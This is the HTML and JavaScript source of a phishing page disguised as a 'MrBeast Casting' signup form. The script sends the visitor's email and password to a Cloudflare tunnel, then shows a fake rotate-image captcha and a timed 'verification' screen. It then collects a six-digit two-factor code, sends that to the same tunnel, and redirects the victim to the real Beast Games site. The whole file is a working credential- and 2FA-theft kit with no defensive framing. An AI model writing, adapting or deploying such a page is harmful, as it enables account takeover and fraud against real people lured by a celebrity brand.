<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MrBeast Casting</title>
    <style>
        :root { --blue: #00a8e8; --pink: #f12e3e; }
        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') 70px; opacity: 0.2; z-index: 0; pointer-events: none; }
        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; margin-top: 50px; position: relative; z-index: 10; border: 1px solid #333; }
        .logo { width: 120px; margin-bottom: 20px; }
        input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: #fff; border-radius: 15px; font-size: 16px; outline: none; }
        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        
        /* Rotate Captcha Style */
        #captcha_ui { display: none; padding: 20px; }
        .rotate-container { width: 200px; height: 200px; margin: 0 auto; position: relative; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; background: #000; }
        .rotate-img { width: 100%; height: 100%; transition: transform 0.1s; transform: rotate(140deg); }
        .slider-track { width: 100%; height: 40px; background: #222; border-radius: 20px; margin-top: 30px; position: relative; }
        .slider-handle { width: 60px; height: 40px; background: var(--blue); border-radius: 20px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; }
        
        #loader, #otp_section { display: none; }
        .spinner { border: 4px solid rgba(0, 168, 232, 0.1); border-top: 4px solid var(--blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="box">
        <div id="login_section">
            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="logo">
            <h2>MRBEAST CASTING</h2>
            <p>Apply for the next viral challenge!</p>
            <input type="email" id="email" placeholder="Email Address">
            <input type="password" id="pass" placeholder="Password">
            <button class="btn" onclick="sendLogin()">CONTINUE</button>
        </div>

        <div id="captcha_ui">
            <p>Slide to rotate the image upright</p>
            <div class="rotate-container">
                <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="rotate-img" id="r_img">
            </div>
            <div class="slider-track" id="track">
                <div class="slider-handle" id="handle">>>></div>
            </div>
        </div>

        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>

        <div id="otp_section">
            <h2>SECURITY CHECK</h2>
            <p>Enter the 6-digit code sent to your device</p>
            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:24px;">
            <button class="btn" onclick="submitOTP()">VERIFY & FINISH</button>
        </div>
    </div>

    <script>
        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";

        function sendLogin() {
            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
            fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
            document.getElementById('login_section').style.display = 'none';
            document.getElementById('captcha_ui').style.display = 'block';
            initRotate();
        }

        function initRotate() {
            const handle = document.getElementById('handle'), img = document.getElementById('r_img'), track = document.getElementById('track');
            let dragging = false;
            const move = (e) => {
                if (!dragging) return;
                let x = (e.touches ? e.touches[0].clientX : e.clientX) - track.getBoundingClientRect().left - 30;
                if (x < 0) x = 0; if (x > track.offsetWidth - 60) x = track.offsetWidth - 60;
                handle.style.left = x + 'px';
                let rot = 140 + (x / (track.offsetWidth - 60)) * 220;
                img.style.transform = `rotate(${rot}deg)`;
                if (rot > 350 && rot < 370) { dragging = false; handle.style.background = "#00ff00"; setTimeout(showLoader, 600); }
            };
            handle.addEventListener('mousedown', () => dragging = true);
            handle.addEventListener('touchstart', () => dragging = true);
            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move);
            window.addEventListener('mouseup', () => dragging = false); window.addEventListener('touchend', () => dragging = false);
        }

        function showLoader() {
            document.getElementById('captcha_ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('otp_section').style.display = 'block';
            }, 15000);
        }

        function submitOTP() {
            const c = document.getElementById('2fa_code').value;
            fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
            .then(() => { window.location.href = "https://beastgames.com"; })
            .catch(() => { window.location.href = "https://beastgames.com"; });
        }
    </script>
</body>
</html>
